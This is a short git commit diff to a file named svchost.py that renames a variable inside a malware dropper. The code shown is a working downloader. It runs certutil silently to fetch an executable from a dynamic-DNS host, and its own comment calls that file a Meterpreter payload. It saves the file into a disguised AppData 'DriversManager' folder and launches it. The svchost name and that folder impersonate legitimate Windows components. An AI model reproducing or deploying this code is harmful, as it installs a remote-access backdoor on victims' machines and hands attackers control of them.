2f965f58359d55a6f741baad75fd24eaa84d9352
T-wcs <70718793+T-wcs@users.noreply.github.com>
2020-12-13 00:09:42 +0100

    Update svchost.py

--- svchost.py
+++ svchost.py
@@ -5,15 +5,15 @@ import os
 """ THIS FILE IS PART OF THE FINAL EXECUTABLES """
 
 # ENVIRONMENT VARIABLE TO USE
-letter_drive_path = os.environ["SystemDrive"]
-current_user      = os.environ["USERNAME"]
+letter_drive = os.environ["SystemDrive"]
+current_user = os.environ["USERNAME"]
 
 # FUNCTION TO DOWNLOAD METERPRETER PAYLOAD
 def dwnExec():
-    dwn = 'START /MIN certutil -urlcache -split /f "http://cvdrsn.ddns.net/rvM32.exe" "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe"'.format(letter_drive_path, current_user)
+    dwn = 'START /MIN certutil -urlcache -split /f "http://cvdrsn.ddns.net/rvM32.exe" "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe"'.format(letter_drive, current_user)
     os.system(dwn)
     try:
-        exc = "START /MIN {}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe".format(letter_drive_path, current_user)
+        exc = "START /MIN {}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe".format(letter_drive, current_user)
         os.system(exc)
     except:
         pass
